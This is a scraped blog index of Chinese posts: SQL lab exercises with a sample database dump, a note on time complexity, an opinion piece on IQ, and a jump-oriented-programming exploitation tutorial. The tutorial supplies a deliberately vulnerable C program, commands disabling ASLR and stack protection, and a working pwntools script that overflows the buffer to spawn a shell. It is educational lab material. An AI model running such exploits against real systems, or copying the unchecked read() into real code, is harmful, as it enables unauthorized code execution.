Employee;\n```\n\n2) 查询每个雇员的地址和电话\n\n```sql\nselect Name, Address, PhoneNumber from Employee;\n```\n\n3) 查询EmployeeID为1001的雇员的地址和电话。\n\n```sql\nselect Address, PhoneNumber from Employee where EmployeeID like '1001';\n```\n\n4) 查询女雇员地址和电话，并将结果中各列的标题分别指定为“地址”和“电话”。\n\n```sql\nselect Address as '地址' , PhoneNumber as '电话' from Employee where Sex like '1';\n```\n\n5) 计算每个雇员的实际收入。\n\n```sql\nselect Salary.Income-Salary.Outcome as '工资' from Employee,Salary where Employee.EmployeeID=Salary.EmployeeID;\n```\n\n6) 找出所有姓王的雇员的部门号。\n\n```sql\nselect DepartmentID from Employee where Name like '王%';\n```\n\n7) 找出所有地址中含有“阳”的雇员的号码和部门号。\n\n```sql\nselect PhoneNumber, DepartmentID from Employee where Address like '%阳%';\n```\n\n### 4. 练习多表连接查询和嵌套查询：\n\n1)查询每个雇员的情况及工资情况（工资=Income - Outcome)。\n\n```sql\nselect Employee.*, Salary.Income-Salary.Outcome as '工资' from Employee,Salary where Employee.EmployeeID=Salary.EmployeeID;\n```\n\n2)查询财务部工资在2200元以上的雇员姓名及工资情况。\n\n```sql\nselect Employee.Name,Salary.Income-Salary.Outcome as '工资' from Employee,Departments,Salary where Employee.DepartmentID = Departments.DepartmentID \nand Departments.DepartmentName='财务部' and Salary.EmployeeID=Employee.EmployeeID and Salary.Income-Salary.Outcome>2200;\n```\n\n3)查询研发部在1966年以前出生的雇员姓名及其工资详情(工资详情包括收入、支出、工资)。\n\n```sql\nselect Employee.Name,Salary.income,Salary.Outcome, Salary.Income-Salary.Outcome as '工资' from Employee,Departments,Salary where Employee.Birthday < '1966-00-00' and Departments.DepartmentID = Employee.EmployeeID and Departments.DepartmentName='研发部';\n```\n\n4)查询人力资源部雇员的最高和最低工资。\n\n```sql\nSELECT MAX(Salary.Income-Salary.Outcome) as '最高工资',MIN(Salary.Income-Salary.Outcome) as '最低工资'\nFROM Salary,Employee,Departments\nWHERE Salary.EmployeeID=Employee.EmployeeID AND\n\t\t\tEmployee.DepartmentID=Departments.DepartmentID AND\n\t\t\tDepartments.DepartmentName='人力资源部';\n```\n\n5)将各雇员的情况按工资由低到高排列。\n\n```sql\nSELECT Salary.Income-Salary.Outcome as '工资' from Salary ORDER BY Salary.Income-Salary.Outcome ASC;\n```\n\n6)求各部门的雇员数及对应的部门名称。\n\n```sql\nSELECT COUNT(Employee.EmployeeID) as '雇员数',Departments.DepartmentName as '部门'\nfrom Departments,Employee\nWHERE Employee.DepartmentID=Departments.DepartmentID\nGROUP BY Departments.DepartmentName;\n```\n\n7)找出所有在财务部和人力资源部工作的雇员的编号。\n\n```sql\nselect EmployeeID from Employee where DepartmentID in (select DepartmentID from Departments where DepartmentName = '财务部' or DepartmentName ='人力资源部');\n```\n\n8)统计人力资源部工资在2500以上雇员的人数。\n\n```sql\nselect Count(*) from Salary where Income - Outcome>2500 and EmployeeID in (\n\tselect EmployeeID from Employee where DepartmentID in (\n\t\tselect DepartmentID from Departments where DepartmentName = '人力资源部'));\n```\n\n9)求财务部雇员的总人数。\n\n```sql\nselect Count(*) from Employee where DepartmentID in (\n\tselect DepartmentID from Departments where DepartmentName = '财务部');\n```\n\n10)求财务部雇员的平均工资。\n\n```sql\nselect AVG(Salary.Income-Salary.Outcome) from Salary,Employee where Salary.EmployeeID = Employee.EmployeeID and Employee.DepartmentID in (\n\tselect DepartmentID from Departments where DepartmentName = '财务部');\n```\n\n11)查找比所有财务部的雇员工资都高的雇员的姓名。\n\n```sql\nselect distinct Name from Employee,Departments,Salary where Employee.EmployeeID = Salary.EmployeeID and Salary.Income-Salary.Outcome > ALL(\n\tselect Salary.Income-Salary.Outcome from Salary,Departments,Employee where Salary.EmployeeID = Employee.EmployeeID and Employee.DepartmentID = Departments.DepartmentID\n\t\tand Departments.DepartmentName = '财务部'\n);\n```\n\n12)查找财务部年龄不低于研发部所有雇员年龄的雇员的姓名。\n\n```sql\nselect Employee.Name from Employee,Departments where Employee.DepartmentID = Departments.DepartmentID and Departments.DepartmentName='财务部'\n\tand Employee.Birthday <= ALL(select Employee.Birthday from Employee,Departments \n\t\t\twhere Employee.DepartmentID = Departments.DepartmentID and Departments.DepartmentName = '研发部');\n```\n\n13)查找在财务部工作的雇员的情况。\n\n```sql\nselect * from Employee where DepartmentID in (select DepartmentID from Departments where DepartmentName = '财务部');\n```\n\n### 5. 提高操作实验\n\n建立“图书_读者”数据库及如下3个表，并输入实验数据，用SQL语句实现如下五个查询：\n\n1）查找这样的图书类别：要求类别中最高的图书定价不低于按类别分组的图书的平均定价的2 倍。\n\n```sql\nselect `类别` from `图书` as BOOK group by `类别` having MAX(`定价`) >= all(select BOOK.`定价` \n\tfrom (select avg(`定价`) * 2 as `定价` from `图书` group by `类别`)BOOK);\n```\n\n2）求机械工业出版社出版的各类图书的平均定价，分别用GROUP BY 和GROUP BY ALL表示。\n\n```sql\nselect `类别`, AVG(`定价`) from `图书` where `出版社` like '机械工业出版社' group by `类别`;\n--mysql不支持GROUP BY ALL\n```\n\n3）列出计算机类图书的书号、名称及价格，最后求出册数和总价格。\n\n```sql\nselect `书号`, `书名`, `定价` from `图书` where `类别` like '计算机';\nselect Count(*) as `总数` from `图书` where `类别` like '计算机';\nselect Sum(`定价`) as `价格总和` from `图书` where `类别` like '计算机';\n```\n\n4）列出计算机类图书的书号、名称及价格，并求出各出版社这类书的总价格，最后求出全部册书和总价格。\n\n```sql\nselect `书号`, `书名`, `定价` from `图书` where `类别` like '计算机';\nselect `出版社`, Sum(`定价`) as `总价` from `图书` where `类别` like '计算机'  group by `出版社`;\nselect Sum(`定价`) as `总价`, count(*) as `总数` from `图书`;\n```\n\n5）查询计算机类和机械工业出版社出版的图书。\n\n```sql\nselect distinct `书名` from `图书` where `类别` like `计算机` and `出版社` like `机械工业出版社`;\n```\n\n表结构如下：\n\n图书：\n\n| 列名   | 类型  | 长度 | 是否可为空 |\n| ------ | ----- | ---- | ---------- |\n| 书号   | char  | 10   |            |\n| 类别   | char  | 12   | 是         |\n| 出版社 | char  | 50   |            |\n| 作者   | char  | 20   | 是         |\n| 书名   | char  | 50   |            |\n| 定价   | money | 8    | 是         |\n\n读者：\n\n| 列名 | 类型 | 长度 | 是否可为空 |\n| ---- | ---- | ---- | ---------- |\n| 编号 | char | 10   |            |\n| 姓名 | char | 8    |            |\n| 单位 | char | 50   | 是         |\n| 性别 | char | 2    | 是         |\n| 电话 | char | 15   | 是         |\n\n借阅：\n\n| 列名     | 类型     | 长度 | 是否可为空 |\n| -------- | -------- | ---- | ---------- |\n| 串号     | char     | 10   |            |\n| 书号     | char     | 10   |            |\n| 读者编号 | char     | 10   |            |\n| 借阅日期 | datetime | 8    |            |\n\n**要求：**\n\n①图书表：书号为主码\n\n②读者表：编号为主码；\n\n③借阅表：串号为主码；\n\n书号为外码，参照表、列是图书表的书号列；\n\n读者编号为外码，参照表、列是读者表的编号列；\n\n**实验数据：**\n\n图书：\n\n| 书号 | 类别   | 出版社             | 作者    | 书名       | 定价 |\n| ---- | ------ | ------------------ | ------- | ---------- | ---- |\n| 1001 | 计算机 | 机械工业出版社     | 王民    | 数据结构   | 80   |\n| 1002 | 计算机 | 机械工业出版社     | 张建平  | 计算机应用 | 20   |\n| 1003 | 计算机 | 电子工业出版社     | 王敏    | 数据库技术 | 15   |\n| 1004 | 计算机 | 电子工业出版社     | 谭浩强  | C 语言     | 25   |\n| 1005 | 英语   | 中国人民大学出版社 | 张锦芯  | 应用文写作 | 25   |\n| 1006 | 管理   | 高等教育出版社     | Robison | 管理学     | 15   |\n| 1007 | 管理   | 机械工业出版社     | Fayol   | 工业管理   | 70   |\n| 1008 | 数学   | 机械工业出版社     | 李平    | 线性代数   | 50   |\n| 1009 | 管理   | 机械工业出版社     | Durark  | 公司的概念 | 14   |\n| 1010 | 数学   | 机械工业出版社     | 徐新国  | 统计学     | 15   |\n\n读者：\n\n| 编号 | 姓名 | 单位         | 性别 | 电话     |\n| ---- | ---- | ------------ | ---- | -------- |\n| 1001 | 丁一 | 数学院       | 男   | 81234567 |\n| 1002 | 赵二 | 经济学院     | 男   | 82234567 |\n| 1003 | 张三 | 管理学院     | 女   | 83234567 |\n| 1004 | 李四 | 文学院       | 男   | 84234567 |\n| 1005 | 王五 | 历史文化学院 | 女   | 85234567 |\n| 1006 | 孙六 | 物理学院     | 男   | 86234567 |\n| 1007 | 周七 | 生命科学院   | 女   | 87234567 |\n| 1008 | 徐八 | 化学院       | 男   | 88234567 |\n| 1009 | 宋九 | 信息学院     | 女   | 89234567 |\n| 1010 | 刘十 | 计算机学院   | 女   | 80234567 |\n\n借阅：\n\n| 串号 | 书号 | 读者编号 | 借阅日期  |\n| ---- | ---- | -------- | --------- |\n| 01   | 1001 | 1003     | 2000-1-1  |\n| 02   | 1002 | 1005     | 2002-3-5  |\n| 03   | 1003 | 1008     | 1998-6-18 |\n| 04   | 1004 | 1003     | 1997-12-8 |\n| 05   | 1005 | 1010     | 2001-5-4  |\n| 06   | 1006 | 1001     | 2005-7-25 |\n| 07   | 1007 | 1010     | 1997-11-3 |\n| 08   | 1008 | 1009     | 2004-2-1  |\n| 09   | 1009 | 1004     | 1996-9-1  |\n| 10   | 1010 | 1008     | 2000-6-4  |\n\n```sql\nSET NAMES utf8;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for Departments\n-- ----------------------------\nDROP TABLE IF EXISTS `Departments`;\nCREATE TABLE `Departments` (\n  `DepartmentID` char(3) COLLATE utf8_unicode_ci NOT NULL COMMENT '员工部门号，主键',\n  `DepartmentName` char(20) COLLATE utf8_unicode_ci NOT NULL COMMENT '部门名',\n  `Note` text COLLATE utf8_unicode_ci COMMENT '备注',\n  PRIMARY KEY (`DepartmentID`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;\n\n-- ----------------------------\n-- Records of Departments\n-- ----------------------------\nBEGIN;\nINSERT INTO `Departments` VALUES ('1', '财务部', '财务部');\nINSERT INTO `Departments` VALUES ('2', '研发部', '研发部');\nINSERT INTO `Departments` VALUES ('3', '人力资源部', '人力资源部');\nCOMMIT;\n\n-- ----------------------------\n-- Table structure for Employee\n-- ----------------------------\nDROP TABLE IF EXISTS `Employee`;\nCREATE TABLE `Employee` (\n  `EmployeeID` char(6) COLLATE utf8_unicode_ci NOT NULL COMMENT '员工编号，主键',\n  `Name` char(10) COLLATE utf8_unicode_ci NOT NULL COMMENT '姓名',\n  `Birthday` datetime(6) NOT NULL COMMENT '出生日期',\n  `Sex` int(2) NOT NULL COMMENT '性别',\n  `Address` char(20) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '家庭地址',\n  `Zip` char(6) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '邮编',\n  `PhoneNumber` char(12) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '电话号码',\n  `EmailAddress` char(30) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '电子邮件地址',\n  `DepartmentID` char(3) COLLATE utf8_unicode_ci NOT NULL COMMENT '员工部门号，外键',\n  PRIMARY KEY (`EmployeeID`),\n  KEY `foreign_key1` (`DepartmentID`),\n  CONSTRAINT `foreign_key1` FOREIGN KEY (`DepartmentID`) REFERENCES `Departments` (`DepartmentID`) ON DELETE NO ACTION ON UPDATE CASCADE\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;\n\n-- ----------------------------\n-- Records of Employee\n-- ----------------------------\nBEGIN;\nINSERT INTO `Employee` VALUES ('1001', '李勇', '1978-03-12 00:00:00.000000', 0, '湖南岳阳', '475001', '3880378', 'ly@henu.edu.cn', '1');\nINSERT INTO `Employee` VALUES ('1002', '王敏', '1980-11-02 00:00:00.000000', 1, '湖南衡阳', '475002', '378311', 'wm@henu.edu.cn', '1');\nINSERT INTO `Employee` VALUES ('1003', '刘晨', '1978-06-22 00:00:00.000000', 0, '湖南娄底', '475003', '378322', 'lc@henu.edu.cn', '1');\nINSERT INTO `Employee` VALUES ('2001', '张立', '1978-08-01 00:00:00.000000', 0, '湖南长沙', '475004', '378333', 'zl@henu.edu.cn', '2');\nINSERT INTO `Employee` VALUES ('2002', '刘毅', '1982-01-23 00:00:00.000000', 0, '湖南岳阳', '475005', '378344', 'ly@henu.edu.cn', '2');\nINSERT INTO `Employee` VALUES ('2003', '张玫', '1981-03-15 00:00:00.000000', 1, '湖南邵阳', '475006', '378355', 'zm@henu.edu.cn', '2');\nINSERT INTO `Employee` VALUES ('3001', '徐静', '1976-08-12 00:00:00.000000', 1, '河南洛阳', '475007', '378366', 'xj@henu.edu.cn', '3');\nINSERT INTO `Employee` VALUES ('3002', '赵军', '1979-02-19 00:00:00.000000', 0, '湖南岳阳', '475008', '378377', 'zj@henu.edu.cn', '3');\nCOMMIT;\n\n-- ----------------------------\n-- Table structure for Salary\n-- ----------------------------\nDROP TABLE IF EXISTS `Salary`;\nCREATE TABLE `Salary` (\n  `EmployeeID` char(6) COLLATE utf8_unicode_ci NOT NULL COMMENT '员工编号，外键',\n  `Income` float(8,0) NOT NULL COMMENT '收入',\n  `OutCome` float(8,0) NOT NULL COMMENT '支出\\n',\n  KEY `foreign_key2` (`EmployeeID`),\n  CONSTRAINT `foreign_key2` FOREIGN KEY (`EmployeeID`) REFERENCES `Employee` (`EmployeeID`) ON DELETE NO ACTION ON UPDATE CASCADE\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;\n\n-- ----------------------------\n-- Records of Salary\n-- ----------------------------\nBEGIN;\nINSERT INTO `Salary` VALUES ('1001', 3600, 1500);\nINSERT INTO `Salary` VALUES ('1002', 3300, 1000);\nINSERT INTO `Salary` VALUES ('1003', 3700, 1200);\nINSERT INTO `Salary` VALUES ('2001', 4000, 1600);\nINSERT INTO `Salary` VALUES ('2002', 3800, 1800);\nINSERT INTO `Salary` VALUES ('2003', 3800, 1500);\nINSERT INTO `Salary` VALUES ('3001', 4200, 2000);\nINSERT INTO `Salary` VALUES ('3002', 4100, 1800);\nCOMMIT;\n```\n\n "},{"title":"Jump-oriented programming(跳转导向编程)","url":"/2018/04/11/JOP攻击/","content":"\n# JOP攻击\n\n## 一、JOP\n\n​        JOP 的全称为 Jump-oriented programming（跳转导向编程）,攻击与ROP 攻击类似。它同样利用二进制可执行文件中已有的代码片段来进行攻击。ROP使用的是ret指令来改变程序的控制流，而JOP攻击利用的是程序间接接跳转和间接调用指令（间接 call 指令）来改变程序的控制流。当程序在执行间接跳转或者是间接调用指令时，程序将从指定寄存器中获得其跳转的目的地址，由于这些跳转目的地址被保在寄存器中，而攻击者又能通过修改栈中的内容来修改寄存器内容，这使得程序中间接跳转和间接调用的目的地址能被攻击者篡改。当攻击者篡改这些寄存器当中的内容时，攻击者就能够使程序跳转到攻击者所构建的 gadget地址处，进而实施 JOP攻击。\n\n## 二、进行攻击必要的环境以及工具\n\n​        本文采用的是Linux中的ubuntu 16.04 LTS  x64系统。其中的工具有pwntools，ROPgadget，gdb-peda。下载和安装的方式如下：\n\n#### pwntools：\n\n```\nsudo pip install pwn\n```\n\n如果系统里没有pip，运行\n\n```\nsudo apt install python-pip\n```\n\n#### ROPgadget:\n\n https://github.com/JonathanSalwan/ROPgadget/tree/master \n\n此工具用来寻找复杂的gadget片段。\n\n#### gdb-peda:\n\n```\ngit clone https://github.com/longld/peda.git ~/peda\necho \"source ~/peda/peda.py\" >> ~/.gdbinit\n```\n\n如果系统里没有git，运行\n\n```\nsudo apt install git\n```\n\n如果apt install失败，请检查系统的源和网络，源在如下文件：\n\n```\nvim /etc/apt/source.list\n```\n\n## 三、预备知识\n\n### 1、函数栈帧结构\n\n参考：https://blog.csdn.net/lqt641/article/details/73002566\n\n### 2、x64架构中的函数传参\n\n​        在x64中前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。\n\n### 3、内存中的相对地址和绝对地址\n\n参考：https://blog.csdn.net/prike/article/details/52722934\n\n## 四、攻击过程\n\n### 1、攻击目的分析\n\n​        攻击的目的是获得一个新的shell，并且拥有root权限，能够正常运行任何命令。那么正常思路就是想办法获取system()函数的地址和\"/bin/sh\"参数的地址，让程序能够自动执行system(\"/bin/sh\")。而且Linux中有一个libc.so.6的C程序运行必要的库，里面保存了大量可利用的函数，而且包含system(\"/bin/sh\")。因此我们可以利用ROPgadget工具获取我们可以利用的代码片段，通过pwntool来利用漏洞程序的漏洞，从而达到我们的攻击目的。\n\n### 2、漏洞代码分析\n\n```c\n//JOP.c\n#include<stdio.h>\n#include<stdlib.h>\n#include<unistd.h>\nvoid clearlove7()\n{\n    char buffer[20];\n    read(STDIN_FILENO, buffer, 512);\n}\nint main()\n{\n    clearlove7();\n    puts(\"NICE TRYN!\");\n    return 0;\n}\n```\n\n很容易发现这是一个有缓冲区溢出漏洞的代码，read()不会检查边界，会一直将字符读取。因此我们可以利用gdb-peda工具判断程序的溢出点。为了方便攻击，首先我们需要关闭地址空间随机化，并且编译程序时关闭栈保护：\n\n关闭地址空间随机化：\n\n```\nsudo -i\necho 0 > /proc/sys/kernel/randomize_va_space\nexit\n```\n\n关闭栈保护：\n\n```\ngcc -fno-stack-protector JOP.c -o JOP -ldl\n```\n\n而且我们需要将libc.so.6二进制文件复制到与漏洞代码相同目录下，我们可以利用ldd命令查看程序是否调用了libc.so.6，并且获取其位置：\n\n```\nldd JOP\n```\n\n经过查看我的系统中libc.so.6位置在：/lib/x86_64-linux-gnu目录下，因此运行如下命令：\n\n```\ncp /lib/x86_64-linux-gnu/libc.so.6 libc.so.6\n```\n\n### 3、程序溢出点的获取\n\n​        分析得到上述程序有缓冲区溢出漏洞之后，我们便可以用gdb-peda工具进行溢出点的获取。安装好gdb-peda工具后，直接gdb可执行文件即可。\n\n![](https://ws2.sinaimg.cn/large/006tNc79gy1fq93o8vfooj30of086abn.jpg)\n\n然后运行pattern_create 150，创建150个字符，并且在运行时输入，然后可以查看程序完成时各个寄存器的状态。\n\n![](https://ws2.sinaimg.cn/large/006tNc79gy1fq93p5e745j31820den07.jpg)\n\n我们可以观察RBP寄存的值，根据栈帧的结构，RBP寄存器指向地址的高8字节地址便是返回地址，而RBP中的值是\"A)AAEAAa\"，对应我们创建150个字符中的第33-40个字符。因此我们可以判断程序的溢出点是\"A\" * 40。所以我们创建payload中的第一部分就可以确定了：\n\n```python\npayload = \"A\" * 40\n```\n\n### 4、system()和\"/bin/sh\"地址的获取\n\n由于程序在运行时加载了libc.so.6，所以我们在gdb中就可以获取到system()和\"/bin/sh\"的地址。\n\n![](https://ws4.sinaimg.cn/large/006tNc79gy1fq93pt7rlej30jt03fdgc.jpg)\n\n因此可以得出，system()的地址为0x7ffff7a52390，\"/bin/sh\"的地址为0x7ffff7b99d57。所以我们payload中又有了一部分可以确定：\n\n```python\nsystemaddr = 0x7ffff7a52390\nbinshaddr = 0x7ffff7b99d57\npayload = \"A\" * 40 + p64(systemaddr) + p64(binshaddr)\n```\n\n### 5、gadget的分析以及利用\n\n​        既然我们已经获得了system()和\"/bin/sh\"的地址了，那么如何调用system()函数并且其参数是\"/bin/sh\"呢？上面的预备知识已经提到，x64架构传参的规则：利用RDI寄存器。所以我们要想办法把\"/bin/sh\"的地址放到RDI里面。那么如何使机器能够执行system函数呢？在这里我的思路是利用RAX寄存器，将system()地址放到RAX里面，再寻找有jmp rax的代码片段加以利用，同时利用RDI寄存器传递参数\"/bin/sh\"，我们的目标就达成了，即运行system(\"/bin/sh\")。\n\n第一步：通过程序漏洞的溢出点，使程序跳转到能够运行将system()函数地址放到RAX寄存器代码片段，并且能够返回。这里运用了ROP的思想。所以我们利用ROPgadget工具运行以下指令：\n\n```\nROPgadget --binary 'libc.so.6' --only 'pop|ret' | grep rax\n```\n\n![](https://ws1.sinaimg.cn/large/006tNc79gy1fq93qabkvhj30mt02x74p.jpg)\n\n利用逻辑地址0x0000000000033544处的指令即可。所以我们的payload又增添一部分：\n\n```python\nsystemaddr = 0x7ffff7a52390\nbinshaddr = 0x7ffff7b99d57\npop_ret_addr = 0x0000000000033544 - libc.symbols['system'] + systemaddr\npayload = \"A\" * 40 + p64(pop_ret_add) + p64(systemaddr) + p64(binshaddr)\n```\n\n为什么要把pop_ret_add覆盖到systemaddr的前面呢？因为程序首先会返回到pop_ret_addr处执行gadget指令，返回之后栈顶指针会指向systemaddr，而gadget中的pop rax又会将systemaddr弹出放入rax里面，这样就达成了我们将system()函数地址放入rax中的目的。而ret指令又会将栈顶弹出，放入rip，所以下面我们要找有关pop rdi和有关jmp rax的gadget。\n\n第二步：找到含有pop rdi和有关jmp rax的gadget。我们需要运行以下指令：\n\n```\nROPgadget --binary 'libc.so.6' --only 'pop|jmp' | grep rax\n```\n\n![](https://ws1.sinaimg.cn/large/006tNc79gy1fq93qoep27j30n40dq41c.jpg)\n\n可以很容易的找出来，0x0000000000104052处的指令有pop rdi和jmp rax。所以我们payload的最后一部分可以得到：\n\n```python\nsystemaddr = 0x7ffff7a52390\nbinshaddr = 0x7ffff7b99d57\npop_ret_addr = 0x0000000000033544 - libc.symbols['system'] + systemaddr\npop_jmp_addr = 0x0000000000104052 - libc.symbols['system'] + systemaddr\npayload = \"A\" * 40 + p64(pop_ret_add) + p64(systemaddr) + p64(pop_jmp_addr) + p64(binshaddr)\n```\n\n程序ret到pop_jmp_addr后，又将binshaddr弹出放入rdi，即pop rdi指令。这时，我们将system()的地址放入了rax，将\"/bin/sh\"的地址放入了rdi，参数和函数双全，只需要一个jmp rax就可以实现我们的攻击了。\n\n所以最后的攻击程序如下：\n\n```python\n#!/usr/bin/env python\nfrom pwn import *\n\nlibc = ELF('libc.so.6')\np = process('./JOP')\n\nsystemaddr = 0x7ffff7a52390\nbinshaddr = 0x7ffff7b99d57\npop_ret_addr = 0x0000000000033544 - libc.symbols['system'] + systemaddr\npop_jmp_addr = 0x0000000000104052 - libc.symbols['system'] + systemaddr\npayload = \"A\" * 40 + p64(pop_ret_add) + p64(systemaddr) + p64(pop_jmp_addr) + p64(binshaddr)\n\np.send(payload)\np.interactive()\n```\n\n这里的pop_ret_addr和pop_jmp_addr需要做一下物理地址的计算，因为我们已经知道了system()的物理地址，而我们利用的gadget和system都在libc.so.6中，所以我们用libc.symbols['system']得到system()的逻辑地址，并进行gadget和其偏移量的计算，最后算出pop_ret_addr和pop_jmp_addr的物理地址。\n\n攻击效果：\n\n![](https://ws2.sinaimg.cn/large/006tNc79gy1fq93r0j441j30nj06nq3m.jpg)\n\n（本人攻击时的文件名均为ROP，读者将其改为JOP即可）\n\n参考：\n\nhttp://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.78e74d82WcwIGi&articleid=403\n\nhttps://blog.csdn.net/alimobilesecurity/article/details/53067274\n\n#  "},{"title":"关于时间复杂度","url":"/2018/02/11/时间复杂度--18.2.13/","content":"\n一个好的算法应该具备时间效率高且要求存储量低的特点。这里只记录时间效率的衡量的方式。今年12月份-明年1月份左右就要考研了。这里记录的大部分可能针对考研中的算法时间复杂度分析。\n\n<!--more-->\n\n对于时间复杂度的分析，我们只要牢记一句话，就能把定义搞明白：将算法中基本操作的执行次数作为算法时间复杂度的度量。这里讨论的时间复杂度不是执行完一段程序的总时间，而是其执行基本操作的总次数。所以时间复杂度指的是次数值，而不是一个时间长度。而这里的基本操作，在我目前的知识水平理解来，可以包括赋值、运算（加减乘除等等）、函数调用等等。因此，对一个算法进行时间复杂度分析的要点，无非是明确算法中哪些操作是基本操作，然后计算出基本操作重复执行的次数即可。在一个算法中，总能找到一个n，可以称为问题的规模，如果要处理的数组元素的个数为n，那么基本操作所执行的次数是n的一个函数f(n)（这里的函数是数学函数的概念，不是编程语言中的函数的概念）。对于求其基本操作执行的次数，就是求函数f(n)。求出以后就可以取出f(n)中随n增大而增长最快的项，然后将其系数变为1，作为时间复杂度的度量，记为T(n) = O(f(n)中增长最快的项/此项的系数)。例如，f(n) = 2n^3 + 4n^2 + 100，则其时间复杂度为T(n) = O(2n^3/2) = O(n^3)。实际上计算算法的时间复杂度就是给出相应的数量级，当f(n)与n无关时，时间复杂度为T(n) = O(1)；当f(n)与n是线性关系时，T(n) = O(n)；当f(n)与n是平方关系时，T(n) = O(n^2)；以此类推。\n\n总结一下，求一个算法的时间复杂度可以分为以下几个步骤：\n\n1、明确算法的问题规模，明确算法中的基本操作。\n\n2、基于算法的问题规模计算算法中执行基本操作的次数，即计算f(n)。\n\n3、找出f(n)中增长最快的项，除以系数，即可求出T(n) = O(n)。\n\n注意：有的算法中基本操作的执行次数不仅跟初始输入的数据规模有关， 还和数据本身有关。例如，一些排序算法，同样有n个待处理数据，但数据初始有序性不同，则基本操作的执行次数也不同。因此排序算法中时间复杂度分为最佳情况、平均情况和最差情况。因此一般依照使得基本操作执行次数最多的输入来计算时间复杂度，即将最坏的情况作为算法时间复杂度的度量。\n\n**常见的时间复杂度有：**\n\n常数阶O(1) < 对数阶O(log2n) < 线性阶O(n) <线性对数阶O(nlog2n) < 平方阶O(n^2) < 方阶O(n^3) < k次方阶O(n^k) < 指数阶O(2^n) < O(n!) < O(n^n)\n\n![](https://ws4.sinaimg.cn/large/006tKfTcgy1focvsw2z8yj30go0a8wid.jpg)\n\n### 例子1：\n\n求出以下算法的时间复杂度\n\n```c++\nviod fun(int n)\n{\n    int i = 1;\n    int j = 100;\n    while(i < n){\n        j++;\n        i+=2;\n    }\n}\n```\n\n##### 第一步：找出基本操作，确定规模n。\n\n1）找出基本操作。基本操作即以求时间复杂度为目的的前提下，重复执行次数和算法的执行时间成正比的操作。通俗的说，这种操作组成了算法，当它们都执行完的时候算法也结束了，多数情况下取最深层循环内的语句所描述的操作为基本操作，显然本例中j++与i+=2这两行都可以作为基本操作。\n\n2）确定规模。由循环条件i < n可知，循环执行的次数（基本操作执行的次数）和参数n有关，因此参数n就是我们所说的规模n。\n\n##### 第二步：计算出n的函数f(n)。\n\n显然，n确定以后，循环的结束与否和i有关。i的初值为1，每次自增2，假设i自增m次后循环结束，则i最后的值为1 + 2m，因此有1 + 2m + K = n（其中K为一个常数，因为在循环结束时i的值稍大于n，为了方便表述和进一步计算，用K将1 + 2m修正成n，因为K为常数，所以这样做不会影响最终时间复杂度的计算），解得m = (n - 1 - K)/2，即f(n) = (n - 1 - K)/2，可以发现其中增长最快的项为n/2，因此时间复杂度T(n) = O(n)。\n\n### 例子2：\n\n分析一下算法的时间复杂度\n\n```c++\nvoid fun(int n)\n{\n    int i;\n    int j;\n    int x = 0;\n    for(i = 0; i < n; i++)\n        for(j = i + 1; j < n; j++)\n            x++;\n}\n```\n\n分析：\n\nx++处于最内层循环，因此取x++作为基本操作。显然n为规模，可以算出x++的执行次数为f(n) = n * (n - 1) / 2，变化最快的项为n^2/2，因此时间复杂度为T(n) = O(n^2)。\n\n### 例子3：\n\n```c++\nvoid fun(int n)\n{\n    int i = 0;\n    int s = 0;\n    while(s < n){\n        i++;\n        s += i;\n    }\n}\n```\n\n分析：\n\n显然规模为n，基本操作为i++和s += i，i与s都从零开始，假设循环执行m次结束，则有s1 = 1，s2 = 1 + 2 = 3，s3 = 1 + 2 + 3 = 6，……，sm = m(m + 1)/2（其中sm为执行到第m次的时候s的值），则有m(m + 1)/2 + K = n（K为起修正作用的常数），由求根公式得，m = [-1 + 根号下(8n + 1 - 8K) ]/2，即f(n) = [-1 + 根号下(8n + 1 - 8K) ]/2。因此时间复杂度为T(n) = O(根号n)。\n\n### 三条总结：\n\n1、取决于执行次数最多的语句，如当有若干个循环语句时，算法的时间复杂度是由嵌套层数最多的循环语句中最内层语句的频度f(n)决定的。\n\n2、如果算法的执行时间不随着问题规模n的增加而增长，即使算法中有上千条语句，其执行时间也不过是一个较大的常数。此类算法的时间复杂度是O(1)\n\n3、算法的时间复杂度不仅仅依赖于问题的规模，还与输入实例的初始状态有关。","tags":["algorithm"]},{"title":"人之间IQ到底有没有差距","url":"/2018/02/11/关于智商的一些看法--18.2.13/","content":"\n偶然在知乎上看到了一个关于人和人之间智商是不是真的有差别的题，有一位小哥的回答如下：\n\n<!--more-->\n\n我就是那个坚持说人与人的智商没有什么差别的人。因为我不知道什么是智商，如果智商指的是解决问题的能力的话，我发现这个受很多因素的影响。\n\n1：受环境因素的影响，比如一个人的父母都是机械工程师，家里的玩具，平时接触到的很多东西都是机械。（当然这个的父母要是正常热爱机械的人，这样才更有可能影响到这个人）那么这个人可能在机械上会更有领悟力，更有所谓的天赋。\n\n2：受情绪的影响。如果一个人对有些东西或观念过于执着。通常这会影响到的他的变通能力，同时就影响到他解决问题的能力。因为他会把这些观念变成一个无法改变的前提，而这些无法改变的前提通常就是需要解决的问题所在。\n\n3：受性格的影响。有时候一个人习惯了求助别人的人，他碰到的第一反应会是去求助别人，而不是自己去解决问题。可是你不能就否认他没有解决问题的能力。\n\n4：另外一个问题：解决问题的能力他是一个渐进性的成长。你说一个人聪明，智商高是因为他解决问题的成功率高，可是我敢断言他也会有一筹莫展的时候，因为那些巨牛的物理学家也会陷入困境。可是我们人不知道为什么老是希望神话他们，老是忽略他们在为提高个人解决能力而付出的努力。他们接触问题的能力渐进的原因是在于他们把每一次困顿，挫折都变成他们向上的阶梯。\n\n我个人的对智商的看法是：智商是一个复杂的系统，他不是单纯的简单的一个1加1等于2的逻辑。他是一个你愿意抛弃放弃自我的成见，付出你的生命，你所有的爱来拥抱世界，拥抱真理的勇气。有时候我甚至自己都有点迷糊，我到底是在描述智商还是在描述宗教。有时候我甚至怀疑智商某种程度上就是一种爱，你过于爱一个东西进而陷入到一种无我的专注，而在这种忘我的专注中你获得幸福，一种尘世中无法得到的幸福